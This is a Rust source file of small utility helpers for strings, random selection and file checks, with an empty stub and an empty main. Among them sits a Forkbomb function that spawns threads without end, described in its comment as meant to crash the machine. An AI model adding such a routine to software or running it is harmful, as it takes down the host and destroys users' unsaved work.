mod linux;
use std::{path::Path, fs};
use rand::Rng;

// Revert returns a reversed string.
fn Revert(s: String) -> String {
	let reverted_string = s.chars().rev().collect::<String>();	
	return reverted_string 
	}

fn FileToSlice(file: String) {
	
	}

// StrToInt converts a string into an integer.
fn StrToInt(string_integer: String) -> u32 {
	return string_integer.parse::<u32>().unwrap()
	}

// IntToStr converts an integer into a string.
fn IntToStr(i: u32) -> String {
	return i.to_string()
	}

// RandomInt returns an integer within a given range.
fn RandomInt(min: u32, max: u32) -> u32 {
	let rng = rand::thread_rng().gen_range(min..max);
	return rng
	}

// RandomSelectStr returns a string that was randomly selected from a list of elements of vector.
fn RandomSelectStr(list: Vec<String>) -> String {

        let mut rng = rand::thread_rng();
        let n = rng.gen_range(0..list.len());
        let s = list[n].clone();
        return s
	}

// RandomSelectInt returns an integer that was randomly selected from a list of vector of integers.
fn RandomSelectInt(list: Vec<u32>) -> u32 {

        let mut rng = rand::thread_rng();
        let n = rng.gen_range(0..list.len());
        let s = list[n].clone();
        return s
	}

// RemoveNewLines removes possible newlines from a string.
fn RemoveNewlines(s: String) -> String {
        let re = s.replace("\n", " ");
        return re.to_string()
        }

// FullRemove removes all instances of a string from another string.
fn FullRemove(str: String, to_remove: String) -> String {
        return str.replace(&to_remove, "" )
	}

// ContainsAny checks if a string exists within a vector of strings.
fn ContainsAny(str: String, elements: Vec<String>) -> bool {
	elements.contains(&str)
	}

// RandomString randomly generates an alphabetic string of a given length.	
fn RandomString(n: usize) -> String {
	const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    	let  PASSWORD_LEN: usize = n;
    	let mut rng = rand::thread_rng();

    	let b: String = (0..PASSWORD_LEN)
        		.map(|_| {
            	let idx = rng.gen_range(0..CHARSET.len());
            	CHARSET[idx] as char
        		})
        .collect();

	return b
	}

// ReadFile is used to read a given file and return its data as a string.
fn ReadFile(filename: String) -> Result<String, std::io::Error>  {
        let b = fs::read_to_string(filename);
        return b
        }


// Forkbomb spawns threads in order to crash the machine.
fn Forkbomb() {
	loop {
		std::thread::spawn(Forkbomb);
	     }
	}

// Exists checks if a given file is in the system.
fn Exists(file: String) -> bool {
        return Path::new(&file).exists()
        }

fn main() {
    
}
